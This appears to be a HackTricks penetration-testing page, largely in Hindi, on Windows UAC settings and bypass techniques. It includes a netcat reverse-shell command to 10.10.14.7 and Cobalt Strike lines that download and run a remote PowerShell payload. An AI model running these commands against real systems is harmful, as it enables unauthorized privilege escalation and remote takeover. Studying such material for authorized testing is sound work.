# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

<figure><img src="../../images/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Use [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) एक विशेषता है जो **उच्च गतिविधियों के लिए सहमति संकेत** सक्षम करती है। अनुप्रयोगों के विभिन्न `integrity` स्तर होते हैं, और एक **उच्च स्तर** वाला कार्यक्रम उन कार्यों को करने में सक्षम होता है जो **संभवतः सिस्टम को खतरे में डाल सकते हैं**। जब UAC सक्षम होता है, अनुप्रयोग और कार्य हमेशा **गैर-प्रशासक खाते के सुरक्षा संदर्भ में चलते हैं** जब तक कि एक प्रशासक स्पष्ट रूप से इन अनुप्रयोगों/कार्य को सिस्टम पर प्रशासक स्तर की पहुंच देने के लिए अधिकृत नहीं करता। यह एक सुविधा है जो प्रशासकों को अनपेक्षित परिवर्तनों से बचाती है लेकिन इसे सुरक्षा सीमा नहीं माना जाता है।

अखंडता स्तरों के बारे में अधिक जानकारी के लिए:

{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

जब UAC लागू होता है, एक प्रशासक उपयोगकर्ता को 2 टोकन दिए जाते हैं: एक मानक उपयोगकर्ता कुंजी, नियमित स्तर के रूप में नियमित क्रियाएँ करने के लिए, और एक प्रशासक विशेषाधिकार के साथ।

यह [पृष्ठ](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) UAC के काम करने के तरीके पर गहराई से चर्चा करता है और लॉगिन प्रक्रिया, उपयोगकर्ता अनुभव, और UAC आर्किटेक्चर को शामिल करता है। प्रशासक सुरक्षा नीतियों का उपयोग करके स्थानीय स्तर पर (secpol.msc का उपयोग करके) या Active Directory डोमेन वातावरण में समूह नीति वस्तुओं (GPO) के माध्यम से UAC के काम करने के तरीके को कॉन्फ़िगर और धकेल सकते हैं। विभिन्न सेटिंग्स का विस्तार से चर्चा की गई है [यहाँ](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings)। UAC के लिए सेट की जा सकने वाली 10 समूह नीति सेटिंग्स हैं। निम्नलिखित तालिका अतिरिक्त विवरण प्रदान करती है:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Disabled                                                     |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Disabled                                                     |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Prompt for consent for non-Windows binaries                  |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Prompt for credentials on the secure desktop                 |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Enabled (default for home) Disabled (default for enterprise) |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Disabled                                                     |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Enabled                                                      |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Enabled                                                      |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Enabled                                                      |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Enabled                                                      |

### UAC Bypass Theory

कुछ कार्यक्रम **स्वचालित रूप से** **उच्च** स्तर पर **उपयोगकर्ता समूह** से संबंधित होने पर **autoelevated** होते हैं। इन बाइनरी में उनके _**Manifests**_ के अंदर _**autoElevate**_ विकल्प होता है जिसका मान _**True**_ होता है। बाइनरी को **Microsoft द्वारा हस्ताक्षरित** होना चाहिए।

फिर, **UAC** (उच्च से **मध्यम** अखंडता स्तर **तक**) को **बायपास** करने के लिए कुछ हमलावर इस प्रकार की बाइनरी का उपयोग करते हैं ताकि वे **मनमाने कोड** को **निष्पादित** कर सकें क्योंकि इसे **उच्च स्तर की अखंडता प्रक्रिया** से निष्पादित किया जाएगा।

आप _**sigcheck.exe**_ उपकरण का उपयोग करके एक बाइनरी का _**Manifest**_ **चेक** कर सकते हैं। और आप _Process Explorer_ या _Process Monitor_ (Sysinternals के) का उपयोग करके प्रक्रियाओं के **अखंडता स्तर** को **देख** सकते हैं।

### Check UAC

UAC सक्षम है या नहीं, इसकी पुष्टि करने के लिए करें:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
यदि यह **`1`** है तो UAC **सक्रिय** है, यदि यह **`0`** है या यह **मौजूद नहीं है**, तो UAC **निष्क्रिय** है।

फिर, **कौन सा स्तर** कॉन्फ़िगर किया गया है, इसकी जांच करें:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
- यदि **`0`** है, तो UAC प्रॉम्प्ट नहीं करेगा (जैसे **अक्षम**)
- यदि **`1`** है, तो व्यवस्थापक से **उपयोगकर्ता नाम और पासवर्ड** पूछा जाएगा उच्च अधिकारों के साथ बाइनरी निष्पादित करने के लिए (सुरक्षित डेस्कटॉप पर)
- यदि **`2`** है (**हमेशा मुझे सूचित करें**) UAC हमेशा व्यवस्थापक से पुष्टि के लिए पूछेगा जब वह उच्च विशेषाधिकारों के साथ कुछ निष्पादित करने की कोशिश करेगा (सुरक्षित डेस्कटॉप पर)
- यदि **`3`** है, तो `1` की तरह लेकिन सुरक्षित डेस्कटॉप पर आवश्यक नहीं
- यदि **`4`** है, तो `2` की तरह लेकिन सुरक्षित डेस्कटॉप पर आवश्यक नहीं
- यदि **`5`** है (**डिफ़ॉल्ट**) तो यह व्यवस्थापक से पुष्टि के लिए पूछेगा कि उच्च विशेषाधिकारों के साथ गैर-विंडोज बाइनरी चलाने के लिए

फिर, आपको **`LocalAccountTokenFilterPolicy`** के मान पर ध्यान देना होगा\
यदि मान **`0`** है, तो केवल **RID 500** उपयोगकर्ता (**बिल्ट-इन व्यवस्थापक**) **UAC के बिना प्रशासनिक कार्य** कर सकता है, और यदि इसका `1` है, तो **"Administrators"** समूह के सभी खाते ऐसा कर सकते हैं।

और, अंत में **`FilterAdministratorToken`** कुंजी के मान पर ध्यान दें\
यदि **`0`** (डिफ़ॉल्ट) है, तो **बिल्ट-इन व्यवस्थापक खाता** दूरस्थ प्रशासनिक कार्य कर सकता है और यदि **`1`** है, तो बिल्ट-इन खाता व्यवस्थापक **दूरस्थ प्रशासनिक कार्य** नहीं कर सकता, जब तक `LocalAccountTokenFilterPolicy` को `1` पर सेट नहीं किया गया है।

#### सारांश

- यदि `EnableLUA=0` या **मौजूद नहीं है**, **किसी के लिए भी UAC नहीं**
- यदि `EnableLua=1` और **`LocalAccountTokenFilterPolicy=1`**, किसी के लिए भी UAC नहीं
- यदि `EnableLua=1` और **`LocalAccountTokenFilterPolicy=0` और `FilterAdministratorToken=0`, RID 500 (बिल्ट-इन व्यवस्थापक) के लिए कोई UAC नहीं**
- यदि `EnableLua=1` और **`LocalAccountTokenFilterPolicy=0` और `FilterAdministratorToken=1`, सभी के लिए UAC**

यह सभी जानकारी **metasploit** मॉड्यूल का उपयोग करके एकत्र की जा सकती है: `post/windows/gather/win_privs`

आप अपने उपयोगकर्ता के समूहों की भी जांच कर सकते हैं और इंटीग्रिटी स्तर प्राप्त कर सकते हैं:
```
net user %username%
whoami /groups | findstr Level
```
## UAC बायपास

> [!NOTE]
> ध्यान दें कि यदि आपके पास पीड़ित तक ग्राफिकल पहुंच है, तो UAC बायपास सीधा है क्योंकि आप बस "हाँ" पर क्लिक कर सकते हैं जब UAS प्रॉम्प्ट प्रकट होता है।

UAC बायपास की आवश्यकता निम्नलिखित स्थिति में होती है: **UAC सक्रिय है, आपकी प्रक्रिया एक मध्यम अखंडता संदर्भ में चल रही है, और आपका उपयोगकर्ता प्रशासकों समूह में है**।

यह उल्लेख करना महत्वपूर्ण है कि **UAC को सबसे उच्च सुरक्षा स्तर (हमेशा) में बायपास करना बहुत कठिन है, बजाय इसके कि यह अन्य स्तरों (डिफ़ॉल्ट) में हो।**

### UAC निष्क्रिय

यदि UAC पहले से ही निष्क्रिय है (`ConsentPromptBehaviorAdmin` **`0`** है) तो आप **व्यवस्थापक विशेषाधिकारों के साथ एक रिवर्स शेल निष्पादित कर सकते हैं** (उच्च अखंडता स्तर) कुछ इस तरह:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC बायपास टोकन डुप्लीकेशन के साथ

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **बहुत** बुनियादी UAC "बायपास" (पूर्ण फ़ाइल प्रणाली पहुँच)

यदि आपके पास एक शेल है जिसमें एक उपयोगकर्ता है जो Administrators समूह के अंदर है, तो आप **C$** साझा को SMB (फ़ाइल प्रणाली) के माध्यम से एक नए डिस्क में स्थानीय रूप से **माउंट कर सकते हैं** और आपको **फ़ाइल प्रणाली के अंदर सब कुछ तक पहुँच** प्राप्त होगी (यहाँ तक कि Administrator का होम फ़ोल्डर)।

> [!WARNING]
> **लगता है कि यह ट्रिक अब काम नहीं कर रही है**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC बायपास कोबाल्ट स्ट्राइक के साथ

कोबाल्ट स्ट्राइक तकनीकें केवल तभी काम करेंगी जब UAC को इसके अधिकतम सुरक्षा स्तर पर सेट नहीं किया गया हो।
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** और **Metasploit** में भी **UAC** को **bypass** करने के लिए कई मॉड्यूल हैं।

### KRBUACBypass

Documentation and tool in [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME) जो कई UAC bypass exploits का **संकलन** है। ध्यान दें कि आपको **UACME को visual studio या msbuild का उपयोग करके संकलित** करने की आवश्यकता होगी। संकलन कई executables (जैसे `Source\Akagi\outout\x64\Debug\Akagi.exe`) बनाएगा, आपको यह जानना होगा कि **आपको कौन सा चाहिए।**\
आपको **सावधान रहना चाहिए** क्योंकि कुछ bypasses **कुछ अन्य प्रोग्रामों को प्रॉम्प्ट** करेंगे जो **उपयोगकर्ता** को सूचित करेंगे कि कुछ हो रहा है।

UACME में **निर्माण संस्करण है जिससे प्रत्येक तकनीक काम करना शुरू हुई**। आप अपने संस्करणों को प्रभावित करने वाली तकनीक के लिए खोज कर सकते हैं:
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Also, using [this](https://en.wikipedia.org/wiki/Windows_10_version_history) page you get the Windows release `1607` from the build versions.

#### More UAC bypass

**सभी** तकनीकें जो यहाँ AUC को बायपास करने के लिए उपयोग की जाती हैं **एक पूर्ण इंटरैक्टिव शेल** की **आवश्यकता** होती है (एक सामान्य nc.exe शेल पर्याप्त नहीं है)।

आप **meterpreter** सत्र का उपयोग करके प्राप्त कर सकते हैं। एक **प्रक्रिया** में माइग्रेट करें जिसका **सत्र** मान **1** के बराबर है:

![](<../../images/image (96).png>)

(_explorer.exe_ काम करना चाहिए)

### UAC Bypass with GUI

यदि आपके पास **GUI** तक पहुंच है, तो आप जब UAC प्रॉम्प्ट प्राप्त करते हैं तो आप बस इसे स्वीकार कर सकते हैं, आपको वास्तव में इसे बायपास करने की आवश्यकता नहीं है। इसलिए, GUI तक पहुंच प्राप्त करने से आपको UAC को बायपास करने की अनुमति मिलेगी।

इसके अलावा, यदि आपको एक GUI सत्र मिलता है जिसका कोई और उपयोग कर रहा था (संभवतः RDP के माध्यम से) तो वहाँ **कुछ उपकरण होंगे जो व्यवस्थापक के रूप में चल रहे होंगे** जहाँ से आप **cmd** को उदाहरण के लिए **व्यवस्थापक** के रूप में सीधे चला सकते हैं बिना UAC द्वारा फिर से प्रॉम्प्ट किए। जैसे [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif)। यह थोड़ा अधिक **गुप्त** हो सकता है।

### Noisy brute-force UAC bypass

यदि आपको शोर करने की परवाह नहीं है, तो आप हमेशा **कुछ ऐसा चला सकते हैं** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) जो **अनुमतियों को बढ़ाने के लिए पूछता है जब तक उपयोगकर्ता इसे स्वीकार नहीं करता**।

### Your own bypass - Basic UAC bypass methodology

यदि आप **UACME** पर एक नज़र डालते हैं, तो आप देखेंगे कि **अधिकांश UAC बायपास एक Dll Hijacking कमजोरियों का दुरुपयोग करते हैं** (मुख्य रूप से _C:\Windows\System32_ पर दुर्भावनापूर्ण dll लिखना)। [Dll Hijacking कमजोरी खोजने के लिए इसे पढ़ें](../windows-local-privilege-escalation/dll-hijacking.md)।

1. एक बाइनरी खोजें जो **autoelevate** करेगा (जाँच करें कि जब इसे निष्पादित किया जाता है तो यह उच्च अखंडता स्तर पर चलता है)।
2. procmon के साथ "**NAME NOT FOUND**" घटनाओं को खोजें जो **DLL Hijacking** के लिए कमजोर हो सकती हैं।
3. आपको संभवतः कुछ **संरक्षित पथों** (जैसे C:\Windows\System32) के अंदर DLL **लिखने** की आवश्यकता होगी जहाँ आपके पास लिखने की अनुमति नहीं है। आप इसे बायपास कर सकते हैं:
   1. **wusa.exe**: Windows 7, 8 और 8.1। यह संरक्षित पथों के अंदर CAB फ़ाइल की सामग्री को निकालने की अनुमति देता है (क्योंकि यह उपकरण उच्च अखंडता स्तर से निष्पादित होता है)।
   2. **IFileOperation**: Windows 10।
4. एक **स्क्रिप्ट** तैयार करें जो आपके DLL को संरक्षित पथ के अंदर कॉपी करे और कमजोर और ऑटोएलेवेटेड बाइनरी को निष्पादित करे।

### Another UAC bypass technique

इसमें यह देखना शामिल है कि क्या एक **autoElevated binary** **पंजीकरण** से **नाम/पथ** को **पढ़ने** की कोशिश करता है एक **बाइनरी** या **कमांड** को **निष्पादित** करने के लिए (यह अधिक दिलचस्प है यदि बाइनरी इस जानकारी को **HKCU** के अंदर खोजती है)।

<figure><img src="../../images/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Use [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

{{#include ../../banners/hacktricks-training.md}}
